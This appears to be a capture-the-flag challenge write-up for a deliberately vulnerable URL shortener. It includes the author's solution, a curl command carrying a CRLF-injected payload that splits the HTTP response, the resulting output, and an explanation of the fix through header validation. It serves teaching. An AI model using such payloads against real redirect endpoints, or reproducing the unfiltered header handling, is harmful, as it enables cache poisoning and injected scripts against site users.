# CRLF Response Splitting — RedirectorCo

A tiny URL-shortener that builds its response by writing raw bytes
to the socket. The `?to=` parameter is spliced into the
`Location:` header with no CR/LF filtering. The handler watches
its own output buffer for a smuggled second HTTP status line
(`\r\nHTTP/1.x NNN`) and, if it sees one, appends the flag — a
self-detector that pays out only when you've successfully cut the
response in half.

## Player target

Cause the handler to emit a complete second HTTP response inside
the same connection.

## Author solution

```bash
curl -i 'http://target:5000/redirect?to=foo%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0a'
```

Response (formatted; CR/LF rendered explicitly):

```
HTTP/1.1 302 Found\r\n
Location: foo\r\n
\r\n
\r\n
HTTP/1.1 200 OK\r\n
Content-Length: 0\r\n
\r\n
... <first response's body and headers continue here> ...
[ctf] smuggled response detected. flag: CTF{REDACTED}
```

## Why this is the lesson

* Never write HTTP headers from raw, unvalidated user input. Every
  framework worth its name (Werkzeug, Express, Tornado) rejects
  CR/LF in header values for exactly this reason — `http.server`
  here is intentionally lower-level.
* Response splitting is the original sin behind cache poisoning,
  injected XSS into proxied caches, and a chunk of the HTTP
  smuggling family.
* The fix is mechanical: validate header values against
  `[\t \x20-\x7E]+` (visible ASCII + tab + space, no CR/LF) or
  rely on a framework that does it for you.
